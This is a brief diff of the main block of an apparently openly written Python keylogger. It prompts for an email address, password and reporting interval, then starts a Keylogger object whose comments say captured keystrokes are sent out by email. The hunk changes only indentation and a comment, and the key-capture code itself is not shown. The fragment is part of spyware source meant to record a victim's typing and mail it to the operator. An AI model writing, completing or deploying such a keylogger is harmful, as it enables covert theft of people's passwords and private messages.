@@ -73,5 +73,5 @@ if __name__ == "__main__":
         ADDRESS = input("Enter email: ")
         PASSWORD = input("Enter password: ")
         REPORT_INTERVAL = int(input("Enter report interval in seconds: "))
-        keylogger = Keylogger(interval=REPORT_INTERVAL)  #send as email  
-        keylogger.start()
+    keylogger = Keylogger(interval=REPORT_INTERVAL) #send 
+    keylogger.start()
